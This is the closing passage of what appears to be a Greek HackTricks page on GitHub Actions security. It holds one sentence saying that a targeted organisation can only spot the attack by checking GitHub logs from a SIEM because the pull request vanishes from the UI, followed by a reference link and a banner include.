> Ο μόνος τρόπος για μια οργάνωση να διαπιστώσει ότι έχει στοχοποιηθεί είναι να ελέγξει τα GitHub logs από SIEM καθώς από το GitHub UI το PR θα έχει αφαιρεθεί.

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
